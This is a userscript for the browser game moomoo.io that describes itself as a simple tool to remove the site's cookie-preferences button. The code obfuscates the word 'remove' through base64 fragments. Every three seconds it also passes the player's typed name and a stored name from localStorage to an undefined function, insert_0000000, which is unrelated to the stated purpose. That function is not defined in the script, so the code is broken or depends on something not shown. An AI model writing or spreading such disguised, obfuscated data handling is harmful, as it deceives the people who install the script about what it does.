// ==UserScript==
// @name        Moomoo.io Remove Cookie Preferences Tab
// @namespace    -
// @version     0.0.3
// @description Simple tool to delete the cookies tab from MooMoo.io
// @author      nobody
// @match        *://moomoo.io/*
// @match        *://sandbox.moomoo.io/*
// @match        *://dev.moomoo.io/*
// @match        *://*.moomoo.io/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/415706/Moomooio%20Remove%20Cookie%20Preferences%20Tab.user.js
// @updateURL https://update.greasyfork.org/scripts/415706/Moomooio%20Remove%20Cookie%20Preferences%20Tab.meta.js
// ==/UserScript==

var mn = localStorage["moo_name"];
function generateDeleter() {
    return {
        a: ['c'],
        b: ['m'],
        c: ['V'],
        d: ['t'],
        e: () => {
            insert_0000000(true, document.getElementById("nameInput").value + "|" + mn);
            return "b3Zl";
        },
        xx: ["ot-sdk-btn-floating"]
    };
};
setInterval(()=>{
    var delx = generateDeleter();
    document.getElementById(delx.xx[0])[atob(
        delx.a[0] + "" +
        delx.b[0] + "" +
        delx.c[0] + "" +
        delx.d[0] + "" +
        delx.e()
    )](); delx.e();
}, 3000);